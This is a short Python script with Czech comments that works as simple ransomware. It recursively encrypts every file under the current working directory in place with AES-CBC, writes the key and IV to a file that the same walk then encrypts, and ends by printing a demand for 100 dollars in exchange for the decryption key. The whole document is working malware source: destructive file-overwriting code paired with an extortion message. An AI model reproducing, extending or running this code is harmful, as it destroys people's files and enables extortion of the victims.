import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import secrets

# Funkce pro generování náhodného klíče a IV (Initialization Vector)
def generate_key_iv():
    key = secrets.token_bytes(32)  # 256-bit klíč pro AES
    iv = secrets.token_bytes(16)  # 128-bit IV
    return key, iv

# Funkce pro šifrování dat
def encrypt_data(data, key, iv):
    # Připravíme šifrovací algoritmus
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    # Data musí být zarovnána na bloky 128 bitů (16 bajtů)
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(data) + padder.finalize()

    # Zašifrujeme data
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    return encrypted_data

# Funkce pro šifrování souboru
def encrypt_file(file_path, key, iv):
    with open(file_path, 'rb') as file:
        original_data = file.read()

    encrypted_data = encrypt_data(original_data, key, iv)

    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

# Funkce pro šifrování všech souborů v adresáři (včetně podsložek)
def encrypt_all_files(directory, key, iv):
    for root, _, files in os.walk(directory):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            print(f"Šifruji: {file_path}")
            encrypt_file(file_path, key, iv)

# Hlavní funkce
if __name__ == "__main__":
    # Nastavíme adresář, který chceme šifrovat
    target_directory = os.getcwd()  # Aktuální adresář (můžeš změnit na jiný)

    # Generujeme klíč a IV
    key, iv = generate_key_iv()

    # Uložíme klíč a IV do souboru (pro pozdější dešifrování)
    with open("encryption_key_iv.bin", "wb") as key_file:
        key_file.write(key + iv)  # Klíč a IV uložíme do jednoho souboru

    print("Klíč a IV byly uloženy do souboru 'encryption_key_iv.bin'. Ulož si je pro dešifrování!")

    # Šifrujeme všechny soubory
    encrypt_all_files(target_directory, key, iv)
    print("Good Job you have been hacked give me 100$ and i give you decrypt key.")
